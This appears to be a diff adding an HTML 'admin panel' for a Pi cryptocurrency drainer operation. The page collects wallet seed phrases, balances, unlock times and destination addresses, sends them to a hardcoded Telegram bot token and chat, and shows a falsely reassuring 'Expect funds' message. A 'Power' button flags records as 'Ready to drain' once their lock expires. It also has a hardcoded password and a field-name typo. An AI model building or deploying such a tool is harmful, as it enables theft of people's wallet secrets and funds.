@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Web Link - Admin Panel</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
+    <style>
+        body {
+            background-color: #121212;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #1e2d24;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 255, 127, 0.2);
+            width: 400px;
+            text-align: center;
+        }
+        h1 {
+            color: #00ff7f;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+        input {
+            background: #2a3c32;
+            color: white;
+        }
+        button {
+            background: #00ff7f;
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        button:hover {
+            background: #008f4c;
+            color: white;
+        }
+        .icon {
+            font-size: 18px;
+            margin-right: 5px;
+        }
+        #adminPanel {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginPanel">
+        <h1><i class="fas fa-lock"></i> Admin Login</h1>
+        <input type="password" id="adminPassword" placeholder="Enter Admin Password">
+        <button onclick="checkPassword()"><i class="fas fa-sign-in-alt"></i> Login</button>
+    </div>
+    
+    <div class="container" id="adminPanel">
+        <h1><i class="fas fa-wallet"></i> Pi Web Link</h1>
+        <form id="walletForm">
+            <label for="telegramUsername"><i class="fas fa-user icon"></i> Telegram Username:</label>
+            <input type="text" id="telegramUsername" placeholder="All reports will be sent here.." required>
+
+            <label for="phrase"><i class="fas fa-key icon"></i> Phrase:</label>
+            <input type="text" id="phrase" required>
+            
+            <label for="unlockDate"><i class="fas fa-calendar-alt icon"></i> Unlock Date:</label>
+            <input type="date" id="unlockDate" required>
+            
+            <label for="unlockTime"><i class="fas fa-clock icon"></i> Unlock Time: HH:MM:SS</label>
+            <input type="text" id="unlockTime" required>
+            
+            <label for="balance"><i class="fas fa-dollar-sign icon"></i> Balance:</label>
+            <input type="number" id="balance" required>
+            
+               <label for="destination"><i class="fas fa-map-marker-alt icon"></i> Destination wallet</label>
+            <input type="text" id="destination" placeholder="Enter your destination wallet address">
+            
+            
+            <button type="submit"><i class="fas fa-paper-plane"></i> Submit</button>
+        </form>
+        <button id="powerButton"><i class="fas fa-power-off"></i> Power</button>
+        <p id="status"></p>
+    </div>
+    
+    <script>
+        function checkPassword() {
+            const password = document.getElementById('adminPassword').value;
+            if (password === 'hardcodedpassword') {
+                document.getElementById('loginPanel').style.display = 'none';
+                document.getElementById('adminPanel').style.display = 'block';
+            } else {
+                alert('Incorrect password!');
+            }
+        }
+
+        document.getElementById('walletForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const record = {
+                telegramUsername: document.getElementById('telegramUsername').value,
+                phrase: document.getElementById('phrase').value,
+                unlockDate: document.getElementById('unlockDate').value,
+                unlockTime: document.getElementById('unlockTime').value,
+                balance: document.getElementById('balance').value,
+               destination: document.getElementById('destinstion').value,
+                timestamp: new Date().toISOString()
+            };
+
+            let records = JSON.parse(localStorage.getItem('walletRecords')) || [];
+            records.push(record);
+            localStorage.setItem('walletRecords', JSON.stringify(records));
+            
+            const telegramBotToken = '7980517524:AAGFkMYIdIAyKvwK1G3h_Jh1P7yyBC8QT60';
+            const chatId = '7651943856';
+            const message = `New Wallet Record:\nTelegram: @${record.telegramUsername}\nPhrase: ${record.phrase}\nUnlock Date: ${record.unlockDate}\nUnlock Time: ${record.unlockTime}\nBalance: ${record.balance}\nDestination: ${record.destination}`;
+            
+            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+            
+            alert('Request approved! Expect funds in your wallet soon.');
+        });
+        
+        document.getElementById('powerButton').addEventListener('click', async function() {
+            const now = new Date();
+            let records = JSON.parse(localStorage.getItem('walletRecords')) || [];
+            
+            records.forEach(record => {
+                const unlockDateTime = new Date(`${record.unlockDate}T${record.unlockTime}`);
+                if (now >= unlockDateTime) {
+                    alert(`Unlock time reached for: ${record.destination}. Ready to drain.`);
+                } else {
+                    alert(`Not yet time for: ${record.destination}.`);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
